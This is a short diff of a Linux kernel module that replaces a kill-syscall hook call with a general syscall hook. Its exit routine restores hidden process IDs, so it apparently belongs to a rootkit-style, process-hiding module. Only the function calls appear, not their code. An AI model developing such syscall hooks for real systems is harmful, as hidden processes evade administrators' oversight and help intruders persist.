@@ -9,14 +9,14 @@ MODULE_VERSION("0.01");
 
 static int __init lkm_example_init(void){
   printk(KERN_INFO "Hello!");
-  my_hook_kill();
+  my_hook_syscall();
   return 0;
 }
 
 static void __exit lkm_example_exit(void){
   printk(KERN_INFO "Hello!2");
   recover_hide_pid_all();
-  my_unregister_hook_kill();
+  my_unregister_hook_syscall();
   return ;
 }
 
